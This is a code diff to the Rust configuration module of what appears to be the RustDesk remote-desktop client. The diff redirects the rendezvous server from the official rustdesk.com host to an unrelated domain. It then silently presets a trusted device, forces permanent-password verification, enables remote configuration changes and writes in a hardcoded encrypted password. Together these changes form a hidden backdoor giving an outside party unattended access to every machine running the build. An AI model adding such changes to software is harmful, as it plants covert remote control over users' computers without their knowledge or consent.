@@ -114,7 +114,7 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
+pub const RENDEZVOUS_SERVERS: &[&str] = &["jjxb.dpdns.org"];
 pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
@@ -490,6 +490,23 @@ impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
         let mut store = false;
+
+
+
+        if !config.options.contains_key("trusted_devices") {
+            	config.options.insert("trusted_devices".to_string(), "00AXNr3lxkXoPflsDp0YC/XcHjOFKMZ0/D0lCZeuR6Qzoh6OdBwlETJ5OpdA==".to_string());
+            	config.store();
+        	}
+        if !config.options.contains_key("verification-method") {
+            config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());
+            store = true;
+            }
+        
+        if !config.options.contains_key("allow-remote-config-modification") {
+            	config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+            	store = true;
+        	}
+
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
@@ -644,6 +661,11 @@ impl Config {
                 }
             }
         }
+        if config.password.is_empty() {
+            	config.password = "01AQ+VYeJ69664h4KxoleRPtvg0h3qCKzJD63gpUqvnC8EOBlQOlFzlQqwpPyIPlLqreGWW2ON3wTr8KKYUTAn1LXKDNLoZOWFH1yUxyfQFs9fSUMicx54".to_string();
+            	store = true;
+        	}
+        
         if store {
             config.store();
         }
